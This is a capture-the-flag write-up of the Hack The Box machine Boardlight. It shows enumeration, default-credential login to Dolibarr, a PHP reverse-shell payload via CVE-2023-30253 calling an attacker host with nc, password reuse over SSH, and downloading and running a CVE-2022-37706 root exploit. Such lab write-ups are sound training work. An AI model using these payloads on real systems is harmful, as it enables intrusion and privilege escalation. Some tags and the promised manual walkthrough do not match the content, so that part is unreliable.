---
title: Hack The Box - Boardlight
date: 2026-04-24
categories: [hackthebox]
tags: [windows,Active Directory,SUID,smbmap,smbclient,Bloodhound,Dcsync,Easy]
comments: true
toc: true
---

Boardlight begins with a Dolibarr CMS instance. I'll authenticate using default credentials and exploit a vulnerability that allows writing raw PHP code into pages to gain an initial foothold. From there, credentials for the next user are found in a configuration file. Privilege escalation to root involves exploiting a CVE in the Enlightenment Window Manager, rather than using a public POC script, I'll walk through the exploitation manually to understand the underlying mechanics.

## Nmap

```bash
#nmap -p- 10.10.11.11 --min-rate 10000 -oN boardlight.nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-16 17:43 CDT
Nmap scan report for board.htb (10.10.11.11)
Host is up (0.11s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 17.39 seconds

#nmap -p 22,80 -sC -sV -oN boardlight-service.nmap 10.10.11.11
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-16 17:44 CDT
Nmap scan report for board.htb (10.10.11.11)
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.71 seconds
```
Nmap scan shows that SSH is listening on its default port, i.e., port 22 , and an Apache web
server is running on port 80

## Port 80
### board.htb
Upon visiting port 80 , we come across a landing page for a cybersecurity consulting firm.
![alt text](/assets/Hackthebox/Boardlight/image.png)

Looking at the page's footer, we come across the hostname board.htb .
![alt text](/assets/Hackthebox/Boardlight/image-1.png)

We'll add board.htb to our /etc/hosts file.

`echo "10.10.11.11 board.htb" >> /etc/hosts` 

## Subdomain Brute force
Next, we'll proceed to find subdomains using ffuf.

```bash
ffuf -u http://board.htb -H "Host: FUZZ.board.htb" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -fw 6243

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://board.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.board.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 6243
________________________________________________

crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 139ms]
```

We'll add it our hosts file.

`echo "10.10.11.11 crm.board.htb" >> /etc/hosts`

## crm.board.htb
 
The site is a login page of Dolibarr. We'll note the version number 17.0.0.
Dolibarr is a modular Enterprise Resource Planning (ERP) and Customer Relationship Management (CRM) software designed for managing various aspects of business operations.

![alt text](/assets/Hackthebox/Boardlight/image-2.png)

Upon trying the credentials admin for both the username and password, we successfully log in.

![alt text](/assets/Hackthebox/Boardlight/image-3.png)

A quick Google search for vulnerabilities affecting Dolibarr version 17.0.0 leads us to CVE2023-30253. This vulnerability states that Dolibarr versions before 17.0.1 allow remote code execution by an authenticated user through an uppercase manipulation, using <?PHP instead of <?php in injected data.

## Shell as www-data 
To exploit this, First we'll create a website tester.

![alt text](/assets/Hackthebox/Boardlight/image-4.png)

And then add a page test.

![alt text](/assets/Hackthebox/Boardlight/image-5.png)

Then we'll edit the source code and add malicious php code. 

![alt text](/assets/Hackthebox/Boardlight/image-6.png)

![alt text](/assets/Hackthebox/Boardlight/image-8.png)

Once we add the php code, we can save and view the page.
![alt text](/assets/Hackthebox/Boardlight/image-9.png)

We code code execution.

![alt text](/assets/Hackthebox/Boardlight/image-7.png)

To get a reverse shell, We'll update the code with bash reverse shell.

```bash
<?PHP echo system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.18 4444 >/tmp/f");?>
```

![alt text](/assets/Hackthebox/Boardlight/image-10.png)

After saving the command we can proceed to save and view our page, and we got shell as www-data

```
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.18] from (UNKNOWN) [10.10.11.11] 48920
bash: cannot set terminal process group (861): Inappropriate ioctl for device
bash: no job control in this shell
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ 
```

## Shell as larissa

Enumerating files We found mysql password in www-data@boardlight:~/html/crm.board.htb/htdocs/conf/conf.php. We'll notedown the password `serverfun2$2023!!`

```php
<?php
//
// File generated by Dolibarr installer 17.0.0 on May 13, 2024
//
// Take a look at conf.php.example file for an example of conf.php file
// and explanations for all possibles parameters.
//
$dolibarr_main_url_root='http://crm.board.htb';
$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';
$dolibarr_main_url_root_alt='/custom';
$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';
$dolibarr_main_db_character_set='utf8';
$dolibarr_main_db_collation='utf8_unicode_ci';
// Authentication settings
$dolibarr_main_authentication='dolibarr';

//$dolibarr_main_demo='autologin,autopass';
// Security settings
$dolibarr_main_prod='0';
$dolibarr_main_force_https='0';
$dolibarr_main_restrict_os_commands='mysqldump, mysql, pg_dump, pgrestore';
$dolibarr_nocsrfcheck='0';
$dolibarr_main_instance_unique_id='ef9a8f59524328e3c36894a9ff0562b5';
$dolibarr_mailing_limit_sendbyweb='0';
$dolibarr_mailing_limit_sendbycli='0';

//$dolibarr_lib_FPDF_PATH='';
//$dolibarr_lib_TCPDF_PATH='';
//$dolibarr_lib_FPDI_PATH='';
//$dolibarr_lib_TCPDI_PATH='';
//$dolibarr_lib_GEOIP_PATH='';
//$dolibarr_lib_NUSOAP_PATH='';
//$dolibarr_lib_ODTPHP_PATH='';
//$dolibarr_lib_ODTPHP_PATHTOPCLZIP='';
//$dolibarr_js_CKEDITOR='';
//$dolibarr_js_JQUERY='';
//$dolibarr_js_JQUERY_UI='';

//$dolibarr_font_DOL_DEFAULT_TTF='';
//$dolibarr_font_DOL_DEFAULT_TTF_BOLD='';
$dolibarr_main_distrib='standard';

```
On checking the home directory we found another user `larissa`
```bash
www-data@boardlight:/home$ ls
ls
larissa
```

we'll try password found earlier to this user larissa and check if the password can be reused.

```bash
www-data@boardlight:/home$ ssh larissa@localhost
ssh larissa@localhost
Could not create directory '/var/www/.ssh'.
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:cfQmOVNyP7asi/B8DSu3+G5gDhuN37I3cqCQM89psFk.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
yes
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
larissa@localhost's password: serverfun2$2023!!

Last login: Mon Sep 15 19:36:36 2025 from 127.0.0.1
larissa@boardlight:~$ 
```
And it works. we can grab user.txt 

```bash
larissa@boardlight:~$ ls
Documents    Pictures  Public     user.txt
Desktop  Downloads    Music    pspy64    Templates  Videos
```

## Shell as root

Checking the SUID binary we found that enlightenment to be interesting.


```bash
larissa@boardlight:~$ find / -type f -perm -4000 2>/dev/null
find / -type f -perm -4000 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
/usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/sbin/pppd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/sudo
/usr/bin/su
/usr/bin/chfn
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/vmware-user-suid-wrapper
larissa@boardlight:~$ id 
id 
uid=1000(larissa) gid=1000(larissa) groups=1000(larissa),4(adm)
larissa@boardlight:~$ 
```

### CVE-2022-37706

```bash
larissa@boardlight:~$ enlightenment --version
enlightenment --version
ESTART: 0.00002 [0.00002] - Begin Startup
ESTART: 0.00013 [0.00011] - Signal Trap
ESTART: 0.00014 [0.00001] - Signal Trap Done
ESTART: 0.00019 [0.00005] - Eina Init
ESTART: 0.00080 [0.00062] - Eina Init Done
ESTART: 0.00085 [0.00004] - Determine Prefix
ESTART: 0.00134 [0.00049] - Determine Prefix Done
ESTART: 0.00137 [0.00004] - Environment Variables
ESTART: 0.00151 [0.00013] - Environment Variables Done
ESTART: 0.00153 [0.00002] - Parse Arguments
Version: 0.23.1
E: Begin Shutdown Procedure!
```

Checking the version of enlightenment. We found it to be 0.23.1
A quick Google search for vulnerabilities
affecting this particular version leads us to CVE-2022-37706, which describes a flaw in
enlightenment_sys in Enlightenment versions before 0.25.4 . This vulnerability allows local
users to gain elevated privilege. We also came across the Poc [exploit](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit). We'll download it to our local macine and transfer it to the box.

```bash
# On our attacker machine

python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/)
```

```bash
# On the box
larissa@boardlight:~$ wget http://10.10.16.18/exploit.sh
larissa@boardlight:~$ chmod +x exploit.sh
larissa@boardlight:~$ ./exploit.sh
larissa@boardlight:~$ ./exploit.sh
CVE-2022-37706
[*] Trying to find the vulnerable SUID file...
[*] This may take few seconds...
[+] Vulnerable SUID binary found!
[+] Trying to pop a root shell!
[+] Enjoy the root shell :)
mount: /dev/../tmp/: can't find in /etc/fstab.
# whoami
root
```


